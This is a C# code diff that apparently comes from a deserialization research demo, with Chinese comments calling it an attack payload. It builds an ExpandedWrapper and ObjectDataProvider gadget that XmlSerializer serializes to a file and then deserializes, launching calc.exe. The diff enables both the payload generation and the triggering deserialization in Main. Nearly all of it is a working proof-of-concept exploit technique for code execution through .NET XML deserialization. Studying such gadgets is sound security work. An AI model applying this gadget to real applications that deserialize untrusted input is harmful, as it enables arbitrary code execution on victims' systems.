@@ -7,10 +7,12 @@ using System.Threading.Tasks;
 using System.Xml.Serialization;
 using System.Data.Services.Internal;
 using System.Windows.Data;
+using System.ComponentModel;
 
 namespace Deserialize
 {
 
+    // 这是一个模拟的可被利用的类
     [XmlRoot]
     public class TestClass
     {
@@ -39,6 +41,7 @@ namespace Deserialize
 
     class Program
     {
+        // 序列化，生成攻击payload
         public static void serializeObjectWithXmlSer()
         {
 
@@ -50,26 +53,29 @@ namespace Deserialize
             wrapper.ProjectedProperty0.MethodParameters.Add("calc.exe");
 
             XmlSerializer serializer = new XmlSerializer(typeof(ExpandedWrapper<TestClass, ObjectDataProvider>));
-            TextWriter fo = new StreamWriter("E:/xmlser.txt");
+            TextWriter fo = new StreamWriter("./xmlser.txt");
             serializer.Serialize(fo, wrapper);
             fo.Close();
         }
 
+        // 反序列化payload, 代码执行
         public static void DeserializerFromXml()
         {
-            using (var stream = new FileStream("E:/xmlser.txt", FileMode.Open))
+            using (var stream = new FileStream("./xmlser.txt", FileMode.Open))
             {
-                var serializers = new XmlSerializer(typeof(ExpandedWrapper<TestClass, ObjectDataProvider>));
-                var testclass = serializers.Deserialize(stream) as TestClass;
+                var wrapper = new ExpandedWrapper<TestClass, ObjectDataProvider>();
+                Type targetType = wrapper.GetType();
+                String targetTypeName = targetType.AssemblyQualifiedName;
+                Console.Write(targetTypeName);
+                var serializers = new XmlSerializer(Type.GetType(targetTypeName));
+                serializers.Deserialize(stream);
             }
         }
 
         static void Main(string[] args)
         {
-
-            //serializeObjectWithXmlSer();
+            serializeObjectWithXmlSer();
             DeserializerFromXml();
-
         }
     }
 }
